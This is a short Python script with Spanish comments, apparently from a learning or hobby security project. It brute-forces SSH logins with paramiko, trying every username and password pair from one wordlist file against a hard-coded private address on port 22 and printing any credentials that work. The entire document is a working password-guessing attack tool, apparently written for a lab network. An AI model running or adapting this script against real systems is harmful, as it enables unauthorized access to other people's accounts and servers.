#! /usr/bin/env python3
#_*_ coding: utf8_*_

import paramiko #Es un modulo que nos permite gestionar conexiones a protocolos ssh o sftp a traves de python, tiene herramientas para ejecutar un cliente como para montar un servidor
import time

def brute_attack(host,puerto,usuario,password):
    log = paramiko.util.log_to_file('arhivo.log')
    cliente = paramiko.SSHClient()
    cliente.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        cliente.connect(host,port=puerto,username=usuario,password=password)
        print('Credenciales obtenidas con exito > Usuario : {} | Contraseña: {}'.format(usuario,password))

    except:
        print('Fallo la autenticacion')

def main():
    ip = "192.168.100.48"
    puerto = 22
    usuarios = open('users_password.txt','r')
    usuarios = usuarios.read().split('\n')
    passwords = open('users_password.txt','r')
    passwords = passwords.read().split('\n')

    for user in usuarios:
        for p in passwords:
            time.sleep(3)
            brute_attack(ip,puerto,user,p)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('Saliendo')
        exit()
